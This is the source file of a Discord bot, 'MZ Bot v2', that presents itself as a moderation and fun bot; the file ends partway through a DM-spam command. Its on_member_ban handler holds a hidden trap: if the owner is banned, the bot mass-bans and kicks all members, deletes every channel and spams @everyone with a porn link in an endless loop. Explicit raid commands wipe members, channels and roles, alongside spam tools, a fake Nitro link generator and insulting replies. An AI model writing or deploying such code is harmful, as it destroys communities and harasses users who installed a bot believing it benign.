# bot.py
print("---MZ Bot v2---")

# startup time
import time

startup_time = time.time()

import os

# install requirements
import mzdependencies

print("Loading virtual env...\n")
os.system("virtualenv venv -p python3")

print("Installing npm dependencies...\n")
for i in mzdependencies.npm_dependencies: os.system(f"npm install {i} --save")

# print("Running `pip install -U pip setuptools`...\n")
# os.system("pip install -U pip setuptools")

"""
Note that we do not upgrade pip and setuptools on every run as it is often unnecessary.
"""

# --- IMPORT MODULES ---

while True:
    try:
        import asyncio
        import datetime
        import random
        import sys
        import timeit
        import socket
        import youtube_dl  # youtube-dl
        import urllib.request
        import re
        import speedtest  # speedtest-cli
        import roblox
        import keep_alive
        import shutil
        import string
        import atexit
        
        # for mobile status:
        import ast
        import inspect
        
        # for git support:
        import git
        
        # import io
        import aiohttp
        import requests
        
        import discord  # git+https://github.com/Rapptz/discord.py OR git+https://github.com/XInTheDark/discord.py
        import discord.abc
        import pytz
        from PyDictionary import PyDictionary
        from discord.ext import commands
        from discord.ext.commands.errors import *
        
        import mzhelp
        import mzutils
        
        # for replit config:
        import replit
        
        # for shell:
        import subprocess
        
        # for OpenAI chatbot:
        import openai
        
        # for moderation:
        import moderation_rules
        
        # for chess:
        import chess  # python-chess
        import stockfish  # stockfish engine
        
        # --- END OF MODULES ---
        print("Imported all modules successfully.\n")
        break
    
    except ModuleNotFoundError:
        print("Running `pip install -r requirements.txt`...\n")
        os.system("pip install -r requirements.txt")


def replitWrite(key: str, value):
    """
    key has to be a string, value can be any value(s).
    However, value has to be JS-serializable.
    """
    
    replit.db[key] = value


def replitDelete(key: str):
    """
    Deletes a key-value pair from the Replit Database.
    """
    replit.db.__delitem__(key)
    
    # alternate:
    # del replit.db[key]


def replitRead(key: str):
    """
    Gets a value from the Replit Database.
    """
    try:
        return replit.db[key]
    except KeyError:
        """Accessing a non-existent key will raise KeyError."""
        return None


def replitGetAllKeys():
    """
    Returns all the keys from Replit Database.
    """
    try:
        return replit.db.keys()
    except Exception:
        return None


def removeprefix(s, prefix):
    """
    Useful for python < 3.9
    Note: This is also defined in mzutils.py
    """
    if s.startswith(prefix):
        return s[len(prefix):]
    return s


def removesuffix(s, suffix):
    """
    Note: This is also defined in mzutils.py
    """
    if s.endswith(suffix):
        return s[:-len(suffix)]
    return s


def replitInit(key: str, value):
    """
    Initialize a variable if it has not been initialized before.
    (i.e. if the key doesn't exist yet)
    """
    if replitGetAllKeys() is None or key not in replitGetAllKeys():
        replitWrite(key, value)


def truncate(s: str):
    if len(s) > 2000:
        s = s[0:1999]
    return s


def safeTruncate(s: str) -> list:
    if len(s) <= 2000:
        return [s]
    
    ret = []
    while len(s) > 2000:
        ret.append(s[0:1999])
        s = s[2000:]
    
    return ret


def openAIinit(envName="OPENAI_API_KEY"):
    openai.api_key = os.getenv(envName)
    return openai.api_key  # returns None if key not found.


def openAItokens(text: str):
    return int(len(text.split()) * 4 / 3 + text.count(string.punctuation))


# status checks
if replitRead("EXITCODE") == 0:
    replitWrite("EXITCODE", 1)
    exit()

# Setting variables
replitWrite("EXITCODE", 1)
replitInit("afk", {})
spam_ban = [726356086176874537]
antinuke = []
bansdict = {}
replitInit("snipes", '')
replitInit("esnipes", '')
replitInit("optoutlist", [])
uptime = 0
replitInit("hardmutes", [])
ownerid = 926410988738183189
istyping = []
replitInit("msgpings", {})
musicDict = {}
bannedWords = mzutils.bannedWords
replitInit("gwended", [])
replitInit("tickets", '')
MAX_INT = 2147483647  # max int32 size
replitWrite("stockfish_installed", False)

# load_dotenv()
TOKEN = os.environ.get('DISCORD_TOKEN')


# ---MOBILE STATUS--- (not working)

# s: https://medium.com/@chipiga86/python-monkey-patching-like-a-boss-87d7ddb8098e
def source(o):
    s = inspect.getsource(o).split("\n")
    indent = len(s[0]) - len(s[0].lstrip())
    return "\n".join(i[indent:] for i in s)


source_ = source(discord.gateway.DiscordWebSocket.identify)
patched = re.sub(
    r'([\'"]\$browser[\'"]:\s?[\'"]).+([\'"])',  # hh this regex
    r"\1Discord Android\2",  # s: https://luna.gitlab.io/discord-unofficial-docs/mobile_indicator.html
    source_
)

loc = {}
exec(compile(ast.parse(patched), "<string>", "exec"), discord.gateway.__dict__, loc)

discord.gateway.DiscordWebSocket.identify = loc["identify"]
# ---END OF MOBILE STATUS---

intents = discord.Intents.all()
# activity = discord.Activity(type=discord.ActivityType.listening, name=f".help | {len(bot.guilds)} servers")
client = discord.Client(intents=intents)

bot = commands.Bot(command_prefix='.', help_command=None, intents=intents)


# definitions
async def speedTestDownload():
    wifi = speedtest.Speedtest()
    return round((wifi.download()) / 1048576, 2)


async def speedTestUpload():
    wifi = speedtest.Speedtest()
    return round((wifi.upload()) / 1048576, 2)


@bot.event
async def on_ready():
    global uptime
    global downloadSpeed
    # Set Idle status
    # await bot.change_presence(status=discord.Status.idle)
    # # To set dnd change "Idle" to "dnd"
    #
    # # Setting `Watching ` status
    # await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=f".help | {len(bot.guilds)} servers"))
    
    await bot.change_presence(
        activity=discord.Streaming(name=f".help | {len(bot.guilds)} servers", url="https://www.twitch.tv/xinthedarky/"))
    # await bot.change_presence(
    #     activity=discord.Activity(name=f"{len(bot.guilds)} servers | .help", url="https://www.twitch.tv/xinthedarky/",
    #                               type=discord.ActivityType.competing))
    
    global launch_time
    launch_time = datetime.datetime.utcnow()
    
    owner_user = await bot.fetch_user(ownerid)
    channel = await owner_user.create_dm()
    local_ip = socket.gethostbyname(socket.gethostname())
    
    # startup finished! get the startup time
    total_time = time.time() - startup_time
    
    embed = discord.Embed(title="**MZ Bot build succeeded**",
                          description=f"**MZ Bot started at <t:{int(launch_time.timestamp())}:f> (<t:{int(launch_time.timestamp())}:R>)**\n"
                                      f"\nHost IP: __{local_ip}__\nHost: {os.uname()}"
                                      f"\n\n**Startup time:** {round(total_time, 2)} seconds\n"
                          , color=0x00ff00)
    
    await channel.send(embed=embed)
    print(f"MZ Bot start-up complete ({round(total_time, 2)} seconds)")
    
    # init variables
    downloadSpeed = await speedTestDownload()


@bot.event
async def on_disconnect():
    EXITCODE = replitRead("EXITCODE")
    if EXITCODE != 0:
        os.system("kill 1")
        # "kill 1" restarts the container and will automatically re-run the script.


def exit_handler():
    # same as on_disconnect()
    EXITCODE = replitRead("EXITCODE")
    if EXITCODE != 0:
        os.system("kill 1")


# error handling
@bot.event
async def on_command_error(ctx, error):
    print(error)
    
    if isinstance(error, BotMissingPermissions):
        await ctx.reply(f'`Missing Permissions!`', mention_author=False)
    elif isinstance(error, BotMissingAnyRole):
        await ctx.reply(f'`Missing Roles!`', mention_author=False)
    elif isinstance(error, CommandInvokeError):
        msg = await ctx.reply(f'`{error}`\nPlease contact the bot owner for assistance if necessary.',
                              mention_author=False)
        await asyncio.sleep(3)
        await msg.delete()
    elif isinstance(error, CommandOnCooldown):
        msg = await ctx.reply(f'`{error}`', mention_author=False)
        await asyncio.sleep(2)
        await msg.delete()
    elif isinstance(error, MissingRequiredArgument):
        await ctx.reply(f'`Missing Required Arguments!`\nFor the command\'s help page, type `.help <command>`!',
                        mention_author=False)
    elif isinstance(error, TooManyArguments):
        await ctx.reply(f'`Too Many Arguments Provided!`\nFor the command\'s help page, type `.help <command>`!',
                        mention_author=False)
    
    elif not isinstance(error, discord.DiscordException) and not isinstance(error, BaseException):
        # We are being rate limited by discord, reset environment!
        os.system("kill 1")
    
    # if isinstance(error, CommandNotFound):
    #     msg = await ctx.send(f'`Command not found!`')
    #     await asyncio.sleep(3)
    #     await msg.delete()


# @bot.event
# async def on_member_join(member):
#     await member.create_dm()
#     await member.dm_channel.send(f"""Hi {member.mention}! I'm MZ Bot. Type `.help` for my help page.
# Welcome to our server! We hope you enjoy your stay!""")


@bot.event
async def on_guild_join(guild):
    await guild.text_channels[0].send(
        "Hey! I'm MZ Bot! To view all commands, type `.help`! To check the update logs, type `.update`!")


@bot.event
async def on_message(message):
    # --- INIT ---
    
    afkdict = replitRead("afk")
    hardmutes = replitRead("hardmutes")
    msgpings = replitRead("msgpings")
    global bannedWords
    
    if message.content.strip() == f"<@{bot.user.id}>":
        await message.reply(
            "Hey! I'm MZ Bot! To view all commands, type `.help`! To check the update logs, type `.update`!")
    
    if message.author.id in hardmutes:
        await message.delete()
    
    # --- MODERATION RULES & FILTERS ---
    
    for i in bannedWords:
        if i.lower().replace(' ', '') in message.content.lower().replace(' ', ''):
            await message.delete()
            break
    
    await moderation_rules.moderate(message)
    
    # --- AFK HANDLING ---
    
    if str(message.author.id) in afkdict:
        afklist = afkdict[str(message.author.id)]
        tmstp = afklist[1]
        timethen = datetime.datetime.fromtimestamp(int(tmstp))
        timern = datetime.datetime.utcnow()
        timesec = timern - timethen
        
        timesecs = timesec.total_seconds()
        
        if timesecs > 10:
            
            afklen = mzutils.timestr(timesecs)
            
            afkdict.pop(str(message.author.id))
            
            welcomebackmsg = await message.channel.send(f"""Welcome back {message.author.mention}, I removed your AFK
You were AFK for {afklen}""")
            
            try:
                await message.author.edit(nick=
                                          removeprefix(message.author.display_name, "[AFK] "))
            except Exception:
                pass
            
            await asyncio.sleep(7.5)
            await welcomebackmsg.delete()
        replitWrite("afk", afkdict)  # update afkdict
    
    for member in message.mentions:
        if not message.author.bot:
            if member.id != message.author.id:
                if str(member.id) in afkdict:
                    afklist = afkdict[str(member.id)]
                    afkmsg = afklist[0]
                    afktime = int(afklist[1])
                    
                    await message.channel.send(f"{member} is AFK: {afkmsg} - <t:{afktime}:R>")
    
    if message.channel.id in msgpings.keys() and message.author != bot.user:
        await message.reply(msgpings[message.channel.id])
    
    # ------
    await bot.process_commands(message)


def getTextFromEmbed(message):
    if len(message.embeds) > 0:
        msg = ""
        for embed in message.embeds:
            msg += f"(Embed) `Title:` {embed.title}\n`Description:` {embed.description}\n"
        
        return msg
    else:
        return None


def processTextFromEmbed(message, msg):
    embedText = getTextFromEmbed(message)
    
    if embedText is not None:
        msg = msg + "\n" + embedText
    
    return msg


@bot.event
async def on_message_delete(message):
    snipes = replitRead("snipes")
    msg = message.content
    author = message.author
    
    msg = processTextFromEmbed(message, msg)
    
    # add to snipes
    lst = "||2435baff2acdeef16e7f9e810e883ac572e5d04f||".join([str(author.id), str(message.channel.id), msg,
                                                               str(round(message.created_at.timestamp())),
                                                               str(round(datetime.datetime.utcnow().timestamp()))])
    
    snipes[len(snipes)] = lst
    replitWrite("snipes", snipes)


@bot.event
async def on_message_edit(old, new):
    esnipes = replitRead("esnipes")
    oldmsg = old.content
    newmsg = new.content
    author = new.author
    
    oldmsg = processTextFromEmbed(old, oldmsg)
    newmsg = processTextFromEmbed(new, newmsg)
    
    lst = "||9cd692681d3df8f3bb8aa91b903370d31b7fa662||".join([str(author.id), str(old.channel.id), oldmsg, newmsg,
                                                               str(round(old.created_at.timestamp())),
                                                               str(round(datetime.datetime.utcnow().timestamp()))])
    
    esnipes[len(esnipes)] = lst
    replitWrite("esnipes", esnipes)


# Error handling
# @bot.event
# async def on_command_error(self, ctx: commands.Context, error: commands.CommandError):
#     if isinstance(error, commands.CommandNotFound):
#        return  # Return because we don't want to show an error for every command not found
#    elif isinstance(error, commands.MissingPermissions):
#       message = "Error: You are missing required permissions."    elif isinstance(error, commands.UserInputError) or isinstance(error, commands.BadArgument):
#       message = "Error: Your input format is incorrect."
#   else:
#     message = "Error: Something went wrong."

#   await ctx.send(message)


@bot.command(aliases=['update', 'updates', 'updatelogs', 'changelog', 'changelogs'])
async def updatelog(ctx):
    async with ctx.channel.typing():
        try:
            dir_path = os.path.dirname(os.path.realpath(__file__))
            shutil.rmtree(os.path.join(dir_path, "mzbot-v2"))
        except Exception:
            pass
        
        repo = git.Repo.clone_from("https://github.com/XInTheDark/mzbot-v2", "mzbot-v2")  # gets the repo from GitHub
        # master = repo.head.reference
        
        # message = master.commit.message
        # dateTimeStamp = master.commit.committed_date
        # commitID = master.commit.hexsha
        
        description = "**Latest commits from `mzbot-v2`:**\n\n"
        
        # get 5 most recent commits and add them to the string
        for commit in repo.iter_commits('master', max_count=5):
            description += f"Commit date: <t:{commit.committed_date}:f>\n"
            description += f"Commit ID: `{commit.hexsha}`\n"
            description += f"Commit message: `{commit.message}`\n"
            description += "-" * 20 + "\n"
        
        embed = discord.Embed(title="**Update Log**", description=description, color=0x00ff00)
    
    await ctx.reply(embed=embed)
    repo.close()


@bot.command(aliases=['commands', 'cmds', 'view', 'command'])
async def help(ctx, cmd=None):
    helpdict = mzhelp.helpcmdz
    usagedict = mzhelp.helpusage
    
    command_list = []
    for key in helpdict.keys():
        if isinstance(key, str):
            command_list.append(key)
        elif isinstance(key, tuple):
            command_list.append(key[0])
    
    response = "**List of all commands**\n\n"
    response += ", ".join(command_list)
    response += "\n\nYou may use `.help <command>` to get more information about a command."
    
    if cmd is None:
        embed = discord.Embed(title="Help Page", description=response, color=0x00ff00)
        
        await ctx.reply(embed=embed)
    
    else:
        found = False
        helpd = ''
        dictcmdi = None
        
        for i in helpdict.keys():
            if isinstance(i, tuple):
                for name in i:
                    if name == cmd.strip():
                        helpd = helpdict[i]
                        found = True
                        dictcmdi = i
                        break
            
            else:
                if i == cmd.strip():
                    helpd = helpdict[i]
                    found = True
                    dictcmdi = i
                    break
        
        usaged = usagedict[dictcmdi]
        
        if found:
            embed = discord.Embed(title="Command Help Page", description=f"""Command: `.{cmd}`

Information: {helpd}

Usage: {usaged}

*Note: `<>` means required argument(s), `[]` means optional argument(s).""", color=0x00ff00)
            
            await ctx.reply(embed=embed)
        
        else:
            await ctx.reply("Command not found.")


@bot.event
async def on_member_ban(guild, user):
    global antinuke
    global ownerid
    global bansdict
    guildid = guild.id
    # try:
    #     bansdict[guildid] = guild.bans()[guildid] + 1
    # except Exception:
    #     None
    
    if user.id == ownerid:
        rlist = ["Scammer", "Scam Link", "Banned", "Used .ban command", "No Reason Provided", "Dm advertising",
                 "Broke rules", "Ban command used", None]
        krlist = ["Kicked for inactivity", "Violation of rules", "Break rules", "Kick command used", "Kicked bot", None]
        
        if user.id != ownerid:
            print(str(user.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
        else:
            
            for member in guild.members:
                try:
                    await member.ban(reason=random.choice(rlist))
                except Exception:
                    pass
            
            for member in guild.members:
                try:
                    await member.kick(reason=random.choice(krlist))
                except Exception:
                    pass
            
            try:
                try:
                    text_channel_list = []
                    
                    for channel in guild.text_channels:
                        text_channel_list.append(channel)
                    
                    for channel in text_channel_list:
                        try:
                            await channel.delete()
                        except Exception:
                            pass
                
                except Exception:
                    pass
            
            except Exception:
                pass
            
            newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
            for i in range(64):
                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
            
            while True:
                try:
                    await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
EZ
EZ
EZ
EZ
EZ
EZ
https://pornhub.com/**""")
                except Exception:
                    newchannel = random.choice(guild.text_channels)
                
                try:
                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
                    await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
                except Exception:
                    pass


# ANTI NUKE
@bot.command(aliases=['protect', 'protection', 'shield'])
@commands.has_permissions(administrator=True)
async def antinuke(ctx):
    global antinuke
    
    guildid = ctx.message.guild.id
    if not guildid in antinuke:
        antinuke.append(guildid)
        await ctx.reply("Antinuke is now enabled! To disable antinuke, use `.disableantinuke`.")
    else:
        await ctx.reply("Antinuke is already enabled for this server!")


@bot.command(aliases=['disableprotect', 'disableprotection', 'offshield'])
@commands.has_permissions(administrator=True)
async def disableantinuke(ctx):
    guildid = ctx.message.guild.id
    if guildid in antinuke:
        antinuke.pop(guildid)
        await ctx.reply("Antinuke is now disabled! To enable antinuke, use `.antinuke`.")
    else:
        await ctx.reply("Antinuke is already disabled for this server!")


@bot.command()
async def dw(ctx):
    response = """**How does a drop work?**
    -> Every drop usually lasts for a short time!
    -> The winner of the drop gets 10-30 seconds to DM the host!"""
    await ctx.send(response)


def checkIfImage(url):
    response = requests.head(url)
    contentType = response.headers.get('content-type')
    
    return "image" in contentType


@commands.cooldown(1, 2, commands.BucketType.user)
@bot.command(aliases=['memes'])
async def meme(ctx, subreddit: str = "memes", sort: str = "hot"):
    # content = get("https://meme-api.herokuapp.com/gimme").text
    # data = json.loads(content)
    # memeEmbed = discord.Embed(title=f"{data['title']}", color=discord.Color.random()).set_image(url=f"{data['url']}")
    #
    # await ctx.reply(embed=memeEmbed)
    
    startTime = datetime.datetime.utcnow()
    
    async with ctx.channel.typing():
        async with aiohttp.ClientSession() as cs:
            try:
                async with cs.get(f'https://www.reddit.com/r/{subreddit}/{sort}.json?sort=hot',
                                  timeout=7.5,
                                  raise_for_status=True) as r:
                    # If the request returns a 404 status code, the subreddit does not exist
                    if r.status == 404:
                        await ctx.reply(f"The subreddit `{subreddit}` does not exist.")
                        return
            except Exception:
                await ctx.reply("There was an error retrieving data from that subreddit.")
                return
            
            try:
                async with cs.get(f'https://www.reddit.com/r/{subreddit}/{sort}.json?sort=hot',
                                  timeout=7.5,
                                  raise_for_status=True) as r:
                    res = await r.json()
            except Exception:
                await ctx.reply("There was an error retrieving data from that subreddit.")
                return
            
            _url = None
            titleText = None
            
            while _url is None or titleText is None or not checkIfImage(_url):
                if (datetime.datetime.utcnow() - startTime).total_seconds() > 15:
                    await ctx.reply("There was an error retrieving data from that subreddit.")
                    return
                try:
                    num_posts = len(res['data']['children'])
                    randint = random.randint(0, num_posts - 1)
                    titleText = res['data']['children'][randint]['data']['title']
                    _url = res['data']['children'][randint]['data']['url']
                
                except Exception:
                    await ctx.reply("There was an error retrieving data from that subreddit.")
                    return
            
            embed = discord.Embed(title=titleText, description="", color=random.randint(0, 0xFFFFFF))
            
            embed.set_image(url=_url)
            await ctx.reply(embed=embed)


@bot.command(name='-.')
async def dotdashdot(ctx):
    response = ".-. .-. .-. .-. .-. .-. .-. .-. .-. .-."
    
    await ctx.send(response)


@bot.command(name='_.')
async def dotdashdot2(ctx):
    response = "._. ._. ._. ._. ._. ._. ._. ._. ._. ._."
    
    await ctx.send(response)


@bot.command()
async def donate(ctx):
    response = f"""To donate, you may buy any gamepass from https://www.roblox.com/games/6742216868/MuzhenGamingYTs-Place#!/store :)
    Or donate some nitro to <@{ownerid}> ;)"""
    
    await ctx.send(response)


@bot.command()
async def dice(ctx, number_of_dice: int, number_of_sides: int = 6):
    diceStr = [
        str(random.choice(range(1, number_of_sides + 1)))
        for _ in range(number_of_dice)
    ]
    await ctx.send(', '.join(diceStr))


@bot.command()
async def credits(ctx):
    response = f"""Credits to:
    <@{ownerid}> [MuzhenGaming#5088] and NO ONE ELSE."""
    
    await ctx.send(response)


@commands.cooldown(1, 0.5, commands.BucketType.channel)
@bot.command()
async def nitro(ctx):
    # genlist = str(open('nitrogenlist.txt', 'r').read())
    # genlistsplit = genlist.split("\n")
    #
    # response = str(random.choice(genlistsplit))
    
    code = "".join(random.choices(
        string.ascii_uppercase + string.digits + string.ascii_lowercase,
        k=16
    ))
    
    response = f"https://discord.gift/{code}"
    
    await ctx.send(response)


async def waitForReply(ctx, msg: discord.Message, timeout=10):
    global bot
    
    def check(m: discord.Message):
        return m.channel == ctx.channel and m.reference is not None \
            and m.reference.message_id == msg.id and m.author == ctx.author
    
    await bot.wait_for("message", check=check, timeout=timeout)
    # the above statement raises TimeoutError if timed out.
    
    return True


@bot.command()
async def shutdown(ctx):
    if str(ctx.author.id) != str(ownerid):
        print(str(ctx.author.id), "Tried to shutdown the bot by using .shutdown")
        await ctx.send(f"LOL Only <@{ownerid}> can shutdown the bot, get lost\n**YOU GAY**")
        return
    
    msg = await ctx.reply("Do you wish to shutdown the bot?\n"
                          "Reply to this message within 10 seconds to confirm.")
    
    try:
        await waitForReply(ctx, msg)
    except TimeoutError:
        await msg.delete()
        return
    
    replitWrite("EXITCODE", 0)
    
    # quit()
    await ctx.send("`Shutdown executing...`")
    print("Shutdown command executing...")
    
    await bot.close()
    
    # useless code below
    await asyncio.sleep(1)
    while True:
        await asyncio.sleep(0.5)
        quit()


@bot.command()
async def restart(ctx):
    if str(ctx.author.id) != str(ownerid):
        print(str(ctx.author.id), "Tried to shutdown the bot by using .shutdown")
        await ctx.send(f"LOL Only <@{ownerid}> can shutdown the bot, get lost\n**YOU GAY**")
        return
    
    msg = await ctx.reply("Do you wish to restart the bot?\n"
                          "Reply to this message within 10 seconds to confirm.")
    
    try:
        await waitForReply(ctx, msg)
    except TimeoutError:
        await msg.delete()
        return
    
    replitWrite("EXITCODE", 0)
    
    await ctx.send("`Restart executing...`")
    
    os.execv(sys.executable, ['python'] + sys.argv)


@bot.command()
async def mute(ctx, member: discord.Member, *, reason=None):
    if ctx.author.id != ownerid and not ctx.author.guild_permissions.manage_server:
        print(str(ctx.author.id), "Tried to mute", member, "by using .mute")
        await ctx.send("You don't have permissions!")
    else:
        guild = ctx.guild
        try:
            mutedrole = discord.utils.get(guild.roles, name="Muted")
            await member.add_roles(mutedrole, reason=reason)
        except Exception:
            # the Muted role does not exist, need to create one
            mutedrole = await ctx.guild.create_role("Muted",
                                                    permissions=discord.Permissions(send_messages=False))
            await member.add_roles(mutedrole, reason=reason)
        
        await ctx.send(f"`Muted User:{member} Successfully`")


@bot.command()
async def unmute(ctx, member: discord.Member):
    if str(ctx.author.id) != str(ownerid) and not ctx.author.guild_permissions.manage_server:
        print(str(ctx.author.id), "Tried to unmute", member, "by using .unmute")
        await ctx.send("You don't have permissions!")
    else:
        mutedrole = discord.utils.get(ctx.guild.roles, name="Muted")
        await member.remove_roles(mutedrole)
        await ctx.send(f"`Unmuted User: {member} Successfully`")


@commands.cooldown(1, 5, commands.BucketType.guild)
@bot.command()
async def nuke(ctx):
    if not ctx.author.guild_permissions.administrator and not ctx.author.id == ownerid:
        print(str(ctx.author.id), "Tried to nuke channel:", ctx.channel, "by using .nuke")
        await ctx.send("You don't have `Administrator` Permissions!")
    else:
        channelpos = ctx.channel.position
        new_channel = await ctx.channel.clone()
        await new_channel.send(f"""Nuked `{ctx.channel}` Successfully!
Nuke performed by: <@{ctx.author.id}>""")
        await ctx.channel.delete()
        await new_channel.edit(position=channelpos)


@bot.command(aliases=['raidstep1'])
async def softnuke_server(ctx):
    if str(ctx.author.id) != str(ownerid):
        print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .softnuke_server")
        await ctx.send("You don't have permissions to do that!")
    else:
        async def nuke_channel_2(txt):
            if str(txt.author.id) != str(ownerid):
                print(str(txt.author.id), "Tried to nuke channel:", txt.channel, "by using .nuke")
                await txt.send("You don't have permissions to do that!")
            else:
                text_channel_list = []
                for channel in ctx.guild.text_channels:
                    text_channel_list.append(channel)
                
                try:
                    for channel in text_channel_list:
                        await channel.delete()
                except Exception:
                    pass
        
        await nuke_channel_2(ctx)


@bot.command(aliases=['raidstep2'])
async def hardnuke_server(ctx):
    rlist = ["Scammer", "Scam Link", "Banned", "Used .ban command", "No Reason Provided", "Dm advertising",
             "Broke rules", "Ban command used", None]
    krlist = ["Kicked for inactivity", "Violation of rules", "Break rules", "Kick command used", "Kicked bot",
              "Repeated Warnings", "Kicked with Dyno", None]
    
    if str(ctx.author.id) != str(ownerid):
        print(str(ctx.author.id), "Tried to soft nuke THE ENTIRE SERVER by using .hardnuke_server")
        await ctx.send("You don't have `Administrator` Permissions!")
    else:
        for member in ctx.guild.members:
            if member.id != ownerid:
                try:
                    await member.ban(reason=random.choice(rlist))
                except Exception:
                    pass
        
        for member in ctx.guild.members:
            if member.id != ownerid:
                try:
                    await member.kick(reason=random.choice(krlist))
                except Exception:
                    pass
        
        try:
            try:
                text_channel_list = []
                
                for channel in ctx.guild.text_channels:
                    text_channel_list.append(channel)
                
                for channel in text_channel_list:
                    try:
                        await channel.delete()
                    except Exception:
                        pass
                
                for category in ctx.guild.categories:
                    try:
                        await category.delete()
                    except Exception:
                        pass
            
            except Exception:
                pass
        
        except Exception:
            pass
        
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except Exception:
                continue
        
        guild = ctx.message.guild
        newchannel = await guild.create_text_channel(name='raided-by-mz-freerobux')
        for i in range(64):
            await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
        
        while True:
            try:
                await newchannel.send("""**<@everyone> RAIDED BY UR MOM: https://pornhub.com/ EZ Noobs
EZ
EZ
EZ
EZ
EZ
EZ
https://pornhub.com/**""")
            except Exception:
                newchannel = random.choice(ctx.guild.text_channels)
            
            try:
                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
                await guild.create_text_channel(name='raid-raid-raid-raid-raid-raid')
            except Exception:
                pass


# updated.

@bot.command()
@commands.has_permissions(administrator=True)
async def ggstay(ctx, *, server):
    embedVar = discord.Embed(title=f"GG! Stay in **{server}**", description=f"""We won! Stay in that server (**{server}**) to ensure the win!
<a:arrow_animated:875302270173085716> Didn't get a chance to join?
<a:arrow_blue:874953616048402442> Make sure to prioritize our pings and react fast!

<a:arrow_blue:874953616048402442> Keep us on top of your server list!

Keep your eyes here so you don't miss out! <a:verified:869847537547378710>""", color=0x00ff00)
    
    await ctx.channel.send(embed=embedVar)
    msgid = await ctx.channel.fetch_message(ctx.message.id)
    await msgid.delete()


@bot.command()
@commands.has_permissions(administrator=True)
async def lostleave(ctx, *, server):
    embedVar = discord.Embed(title=f"We lost! Leave **{server}**",
                             description=f"""Sorry, we lost! Leave that server (**{server}**) now!**""", color=0x00ff00)
    
    await ctx.channel.send(embed=embedVar)
    msgid = await ctx.channel.fetch_message(ctx.message.id)
    await msgid.delete()


@bot.command()
@commands.has_permissions(administrator=True)
async def tips(ctx):
    embedVar = discord.Embed(title=f"TIPS TO WIN GIVEAWAYS", description=f"""How to win  Giveaways easily?
<a:arrow_blue:874953616048402442> Keep us on top of your server list so you get notified faster!
<a:arrow_blue:874953616048402442> Support us & Claim roles to get longer claim time!
<a:arrow_blue:874953616048402442> Never miss any of our pings!

<a:robux_animated:875280974269784094> Good luck in our giveaways! Have fun! <a:robux_animated:875280974269784094>""",
                             color=0x00ff00)
    
    await ctx.channel.send(embed=embedVar)
    msgid = await ctx.channel.fetch_message(ctx.message.id)
    await msgid.delete()


@bot.command()
@commands.has_permissions(administrator=True)
async def won(ctx, userid, *, prize):
    claimsfile2 = open('proofchannel.txt', 'r')
    prooflines = claimsfile2.readlines()
    server_id = ctx.message.guild.id
    foundserver = False
    
    for i in prooflines:
        if str(server_id) in i:
            i = removeprefix(i, f"{server_id}:")
            proofschannel = f"<#{str(i)}>"
            foundserver = True
            break
    if not foundserver:
        await ctx.channel.send(
            "Cannot find proofs channel! Try using '.setproofschannel'!\n*(Due to a recent update, the proofs "
            "channel can now be set! We strongly encourage you to set it with `.setproofschannel`.)")
        proofschannel = "the proofs channel (if any)"
        
        claimsfile2.close()
        
        embedVar = discord.Embed(title=f"{userid} WON THE PREVIOUS GIVEAWAY!",
                                 description=f"""{userid} Won the previous giveaway for **{prize}**!
<a:blue_fire:874953550030061588> Ask them if we're legit!
<a:yellow_fire:875943816123789335> Check our vouches in the respective channels!
<a:orange_fire:875943965638152202> Check {proofschannel} for payout proofs!
<a:red_fire:875943904158027776> Missed out the last giveaway? Don't worry, we host a lot of giveaways every day! Stay active!

<a:robux_animated:875280974269784094> Good luck in our giveaways! Have fun! <a:robux_animated:875280974269784094>""",
                                 color=0x00ff00)
        
        await ctx.channel.send(embed=embedVar)
        msgid = await ctx.channel.fetch_message(ctx.message.id)
        await msgid.delete()


# The below code bans user.
@commands.cooldown(1, 5, commands.BucketType.guild)
@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason: str = None):
    if not ctx.author.top_role > member.top_role:
        return
    
    await member.ban(reason=reason)
    await ctx.send(f'''User: `{member}` has been banned
Reason: {reason}
- by {ctx.author}''')


@commands.cooldown(1, 5, commands.BucketType.guild)
@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, *, member: str):
    found = 0
    member_name, member_discriminator = member.split("#")
    
    bans = [entry async for entry in ctx.guild.bans(limit=MAX_INT)]
    
    for ban_entry in bans:
        user = ban_entry.user
        
        if (user.name, user.discriminator) == (member_name, member_discriminator):
            await ctx.guild.unban(user)
            await ctx.send(f"""`{user}` has been unbanned
- by {ctx.author}""")
            found = 1
            break
    if found == 0:
        await ctx.reply("Could not find that banned user!")


@commands.cooldown(1, 5, commands.BucketType.guild)
@bot.command()
@commands.has_permissions(kick_members=True)
async def kick(ctx, member: discord.Member, *, reason: str = None):
    if not ctx.author.top_role > member.top_role:
        return
    
    await member.kick(reason=reason)
    await ctx.send(f"""User `{member}` has been kicked
Reason: {reason}
- by {ctx.author}""")


@bot.command()
async def spam(ctx, number_of_times, *, message):
    if ctx.author.id != ownerid and not ctx.author.guild_permissions.administrator:
        await ctx.reply("Omg why are you trying to spam here?!")
    elif ctx.author in spam_ban:
        await ctx.reply("EWWWW NOOB UR BANNED FROM SPAMMING EWWWW")
    else:
        number_of_times = int(number_of_times)
        
        msg1 = await ctx.channel.send(f"Task started by {ctx.author}...")
        
        await ctx.message.delete()
        
        for i in range(number_of_times):
            await ctx.channel.send(message)
        
        await msg1.delete()
        
        number_of_times2 = str(number_of_times)
        
        msg2 = f"""<@{ctx.author.id}>, task done!
Server: {ctx.guild.name}
Channel: {ctx.channel.name}
Message: {message}
Number of times: {number_of_times2}
"""
        dms = await ctx.author.create_dm()
        await dms.send(msg2)


@bot.command(aliases=['dm', 'dms', 'dmsend'])
async def dmspam(ctx, number_of_times: int, user: discord.Member, *, message):
    optoutlist = replitRead("optoutlist")
    
    if ctx.author.id != ownerid and not ctx.author.guild_permissions.administrator:
        await ctx.channel.send("Omg who are you trying to spam?! noob")
